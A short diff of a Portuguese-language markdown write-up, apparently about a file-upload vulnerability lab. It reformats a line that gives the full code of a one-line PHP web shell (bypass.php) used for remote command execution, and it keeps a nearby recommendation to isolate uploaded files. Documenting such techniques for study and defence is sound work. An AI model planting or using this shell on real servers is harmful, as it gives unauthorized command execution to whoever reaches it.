@@ -80,7 +80,7 @@ Isolamento de Uploads: Arquivos enviados por usuários devem ser armazenados em 
 
 ## 📎 Scripts desenvolvidos
 
-[bypass.php](): Um shell PHP simples (<?php system($_GET['cmd']); ?>) utilizado para a execução remota de comandos.
+[bypass.php](): Um shell PHP simples (`<?php system($_GET['cmd']); ?>`) utilizado para a execução remota de comandos.
 
 ---
 
